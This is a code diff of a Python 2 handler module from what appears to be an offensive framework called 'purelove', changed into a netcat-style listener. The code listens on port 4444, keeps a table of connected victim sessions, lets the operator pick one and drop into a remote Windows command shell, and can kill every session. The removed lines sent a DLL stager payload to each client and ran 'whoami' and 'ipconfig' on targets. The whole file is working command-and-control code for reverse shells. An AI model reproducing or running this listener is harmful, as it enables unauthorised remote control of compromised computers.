@@ -2,44 +2,34 @@
 # -*- coding: utf-8 -*-
 #
 
-#
+#=====================================
+# Fix Date:2018-9-23
+# Fix Author:mosin
+# Fix NC Handler Module
+#=====================================
 # https://github.com/hucmosin/purelove
 #
 
-import argparse
 import readline
 import socket
 import sys
 import time
 import threading
-from core import starger
 
-
-CLIENT_COMMANDS = ['shell', 'getuid', 'ipconfig']
 
 HELP_TEXT = '''
 
-Server Command
-==============
+NC Command
+==========
 
 Command               Description
 -------               -----------
 session <id>          Connect to a client.
 sessions              List connected clients.
+shell                 Get into Shell.
 help                  Show this help menu.
-kill                  Kill the client connection.
 quit                  Exit the server.
 
-Client Command
-==============
-
-Command               Description
--------               -----------
-getuid                Get Client OS Whoami.
-ipconfig              Get Client OS eth infomations.
-shell                 Execute a command on the target,get os shell.
-back                  Back into Main menu.
-exit                  Back into Main menu.
 '''
 
 
@@ -52,25 +42,23 @@ class Server(threading.Thread):
     current_flag = True
     current_client = None  
 
-    def __init__(self,host, port):
+    def __init__(self,host, port=4444):
         super(Server, self).__init__()
         self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
         self.s.bind((host, port))
         self.s.listen(10)
-        
+            
     def run(self):
         try:
             while True:
                 conn, addr = self.s.accept()  
                 client_id = self.client_count 
                 client = ClientConnection(conn, addr, uid=client_id)
-                self.send_starge(client)
                 self.clients[client_id] = client #加入session[]
-                self.client_count += 1 
+                self.client_count += 1  
         except:
             pass
-    
     #初始化变量
     def init(self):
         self.clients        = {}
@@ -79,13 +67,6 @@ class Server(threading.Thread):
         self.current_flag   = True
         self.current_client = None 
 
-    #发送starge
-    def send_starge(self,client):
-        dll_len,dll_data = starger.get_win_rple()
-        client.conn.send(dll_len)
-        time.sleep(2)
-        client.conn.send(dll_data)
-        
     #发送数据
     def send_client(self, message, client):
         try:
@@ -121,19 +102,34 @@ class Server(threading.Thread):
             
     #移除连接
     def remove_client(self, key):
-        return self.clients.pop(key, None)
+        return self.clients.pop(key, None)                
 
     #断开连接
     def kill_client(self, _):
         try:
-            self.send_client('kill', self.current_client) 
             self.current_client.conn.close()              
-            self.remove_client(self.current_client.uid) 
+            self.remove_client(self.current_client.uid)
             self.current_client = None
         except:
-            print "[!] Kill Fail. Please Check Kill Client ID."                 
+            print "[!] Kill Fail. Please Check Kill Client ID."                    
 
-    
+    #退出监听
+    def quit_client(self,):
+        try:
+            #Kill ALL client
+            for k, v in self.clients.items():
+                self.current_client = self.clients[int(k)]
+                self.send_client('kill', self.current_client) 
+                self.current_client.conn.close()
+                self.remove_client(self.current_client.uid)  
+                #server.current_client.conn.close()  
+            self.s.shutdown(socket.SHUT_RDWR)   
+            self.s.close()
+            self.init()
+            sys.exit(0)
+        except:
+            pass
+
     #获取当前连接数
     def get_clients(self):
         return [v for _, v in self.clients.items()]
@@ -142,7 +138,7 @@ class Server(threading.Thread):
         '''
         @本函数需传入一个socket套接字，因为为了与windows下的命令管道相连接，配合本监听程序
         '''
-        from core import nc_cmd_shell
+        import nc_cmd_shell
         nc_cmd_shell.nc(server)
     
     #打印连接数
@@ -151,19 +147,6 @@ class Server(threading.Thread):
         print '--   --------------'
         for k, v in self.clients.items():
             print '{:>2}   {}'.format(k, v.addr[0])
-
-    #退出监听服务端
-    def quit_server(self,):
-        for k, v in self.clients.items():
-            self.current_client = self.clients[int(k)]
-            self.send_client('kill', self.current_client) 
-            self.current_client.conn.close()
-            self.remove_client(self.current_client.uid)  
-            #server.current_client.conn.close()  
-        self.s.shutdown(socket.SHUT_RDWR)   
-        self.s.close()
-        self.init()
-        sys.exit(0)
 
     #打印帮助
     def print_help(self, _):
@@ -178,15 +161,15 @@ class ClientConnection():
 
 
 #启动监听
-def run_handler(host,port):
+def run_handler(host = '0.0.0.0',port = 4444):
     client = None
-    send_cmd = ""
+    #send_cmd = ""
     flag = False
     
     server = Server(host,port)
     server.setDaemon(True)
     server.start()
-    print '[*] Purelove server {host} listening on port {port}.'.format(host = host,
+    print '\n[*] Purelove server {host} listening on port {port}.'.format(host = host,
                                                                         port = port)
     #server监听命令
     server_commands = {
@@ -194,12 +177,11 @@ def run_handler(host,port):
         'sessions':      server.list_clients,
         'help':          server.print_help,
         'kill':          server.kill_client,
-        'quit':          server.quit_server
     }
 
     #tab键监听
     def completer(text, state):
-        commands = CLIENT_COMMANDS + [k for k, _ in server_commands.items()]
+        commands = [k for k, _ in server_commands.items()]
 
         options = [i for i in commands if i.startswith(text)]
         if state < len(options):
@@ -209,7 +191,7 @@ def run_handler(host,port):
 
     readline.parse_and_bind('tab: complete')
     readline.set_completer(completer)
-    
+      
     #开始循环监听连接
     while True:
         if server.current_flag == True:
@@ -222,43 +204,30 @@ def run_handler(host,port):
                 else:
                     ccid = '?'
                 #对shell进行操作
-                prompt = raw_input('plesploit {}> '.format(ccid)).rstrip()
+                prompt = raw_input('NC {}> '.format(ccid)).rstrip()
                 if not prompt:
                     continue
                     
                 cmd, _, action = prompt.partition(' ')
                 try:
+                    if ccid == '?':
+                        print '[-] Error: No client selected.'
+                        continue
+
                     if cmd in server_commands:
                         server_commands[cmd](action)
-
-                    elif cmd in CLIENT_COMMANDS:
-                        if ccid == '?':
-                            print '[-] Error: No client selected.'
-                            continue
-            
-                        if cmd == "shell":
-                            send_cmd = "shell"
-                            server.send_client(send_cmd, server.current_client)
-                            server.exec_shell(server)
-                            server.current_flag = False
-                        elif cmd == "getuid":
-                            send_cmd = "whoami"
-                            server.send_client(send_cmd, server.current_client)
-                            server.recv_client(server.current_client)
-                        elif cmd == "ipconfig":
-                            send_cmd = "ipconfig"
-                            server.send_client(send_cmd, server.current_client)
-                            server.recv_client(server.current_client)
-                        else:
-                            print '[!] Invalid command, type "help" to see a list of commands.'
+                        
+                    # Come in nc shell
+                    elif cmd == "shell":
+                        server.exec_shell(server)
+                        server.current_flag = False
                     elif cmd == "exit" or cmd == "back":
                         break
                     else:
-                        print '[!] Invalid command, type "help" to see a list of commands.'
+                        print "[-] Command is Fail."
                 except:
                     print "[!] Shell Fail,Please Check Client ID Or ID is Kill."
-            
-        
-    server.quit_server()
-            
-
+   
+    #HANDLER_CLIENT = server  //保留关键字
+    #Kill ALL client　退出暂时断开全部
+    server.quit_client()
